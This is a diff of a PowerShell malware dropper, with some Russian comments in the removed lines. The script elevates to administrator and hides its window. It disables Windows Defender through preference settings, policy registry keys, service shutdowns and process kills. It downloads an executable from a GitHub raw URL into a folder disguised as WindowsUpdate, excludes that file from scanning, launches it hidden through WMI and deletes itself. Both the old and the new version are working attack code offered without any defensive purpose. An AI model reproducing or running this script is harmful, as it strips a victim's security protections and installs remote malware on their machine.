@@ -1,10 +1,9 @@
-$v1="https://github.com/gseff137-afk/test/raw/refs/heads/main/packages.exe"
-$v2=$env:TEMP+"\"+[System.IO.Path]::GetRandomFileName().Replace(".","")+".tmp"
-$v3=$env:ProgramData+"\"+[System.IO.Path]::GetRandomFileName().Split('.')[0]+"\"
-$v4=$v3+[System.IO.Path]::GetRandomFileName().Split('.')[0]+".exe"
+$exeUrl = "https://github.com/gseff137-afk/test/raw/refs/heads/main/packages.exe"
+$targetFolder = "C:\ProgramData\WindowsUpdate"
+$exePath = "$targetFolder\windows_update.exe"
 
-if(-NOT([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]"Administrator")){
-    Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -Command `"$($MyInvocation.MyCommand.Definition)`"" -Verb RunAs
+if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
+    Start-Process powershell -Verb RunAs -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -Command `"$($MyInvocation.MyCommand.Definition)`""
     exit
 }
 
@@ -12,54 +11,75 @@ Add-Type -Name W -Namespace C -MemberDefinition '[DllImport("Kernel32.dll")]publ
 $c=[C.W]::GetConsoleWindow()
 [C.W]::ShowWindow($c,0)
 
-try{
-    if(!(Test-Path $v3)){New-Item -Path $v3 -ItemType Directory -Force | Out-Null}
-    (New-Object Net.WebClient).DownloadFile($v1,$v2)
-    if(Test-Path $v2){Move-Item $v2 $v4 -Force}
+try {
+    if (-not (Test-Path $targetFolder)) {
+        New-Item -ItemType Directory -Path $targetFolder -Force
+    }
 
-    # Отключаем через PowerShell команды (работает без прав реестра)
-    try{
-        Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
-        Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
-        Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
-    }catch{}
+    Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -UserAgent "Mozilla/5.0"
 
-    # Добавляем в исключения через PowerShell
-    try{
-        Add-MpPreference -ExclusionPath $v4 -ErrorAction SilentlyContinue
-        Add-MpPreference -ExclusionPath $v3 -ErrorAction SilentlyContinue
-    }catch{}
+    $registryPaths = @(
+        "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender",
+        "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"
+    )
+    
+    foreach ($path in $registryPaths) {
+        if (!(Test-Path $path)) {
+            New-Item -Path $path -Force | Out-Null
+        }
+    }
+    
+    $registrySettings = @(
+        @{Path="HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"; Name="DisableAntiSpyware"; Value=1; Type="DWord"},
+        @{Path="HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"; Name="DisableRealtimeMonitoring"; Value=1; Type="DWord"}
+    )
+    
+    foreach ($setting in $registrySettings) {
+        try {
+            Set-ItemProperty -Path $setting.Path -Name $setting.Name -Value $setting.Value -Type $setting.Type -Force
+        } catch {}
+    }
 
-    # Останавливаем службы через sc (более надежно)
     $services = @("WinDefend","WdNisSvc","Sense","SecurityHealthService")
-    foreach($service in $services){
-        try{
-            Start-Process -FilePath "sc" -ArgumentList "stop", $service -Wait -WindowStyle Hidden
+    foreach ($service in $services) {
+        try {
+            Stop-Service -Name $service -Force
+            Set-Service -Name $service -StartupType Disabled
             Start-Process -FilePath "sc" -ArgumentList "config", $service, "start=", "disabled" -Wait -WindowStyle Hidden
-        }catch{}
+        } catch {}
+    }
+
+    $processes = @("MsMpEng.exe","NisSrv.exe","MsSense.exe","SecurityHealthService.exe")
+    foreach ($process in $processes) {
+        try {
+            Get-Process -Name $process.Replace(".exe", "") -ErrorAction SilentlyContinue | Stop-Process -Force
+        } catch {}
+    }
+
+    $e="HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"
+    if (!(Test-Path $e)) {
+        New-Item -Path $e -Force | Out-Null
+    }
+    try {
+        New-ItemProperty -Path $e -Name $exePath -PropertyType String -Value "0" -Force
+        New-ItemProperty -Path $e -Name $targetFolder -PropertyType String -Value "0" -Force
+    } catch {}
+
+    Start-Sleep -Seconds 2
+
+    try {
+        $w=[WmiClass]"\\localhost\root\cimv2:Win32_Process"
+        $r=$w.Create("`"$exePath`"")
+    } catch {
+        try {
+            Start-Process -FilePath $exePath -WindowStyle Hidden
+        } catch {}
     }
 
     Start-Sleep -Seconds 3
 
-    # Запускаем файл через WMI (самый скрытный способ)
-    try{
-        $w=[WmiClass]"\\localhost\root\cimv2:Win32_Process"
-        $r=$w.Create("`"$v4`"")
-    }catch{
-        # Если WMI не работает, запускаем скрыто
-        try{
-            Start-Process -FilePath $v4 -WindowStyle Hidden
-        }catch{}
-    }
-
-    Start-Sleep -Seconds 2
-
-    # Очистка
-    if(Test-Path $v2){Remove-Item $v2 -Force -ErrorAction SilentlyContinue}
-
-    # Самоудаление скрипта
     $sp=$MyInvocation.MyCommand.Path
-    if(Test-Path $sp){
-        Start-Process -FilePath "cmd.exe" -ArgumentList "/c","timeout /t 3 > nul & del /f /q `"$sp`"" -WindowStyle Hidden
+    if (Test-Path $sp) {
+        Start-Process -FilePath "cmd.exe" -ArgumentList "/c","ping 127.0.0.1 -n 4 > nul & del /f /q `"$sp`"" -WindowStyle Hidden
     }
-}catch{}
+} catch {}
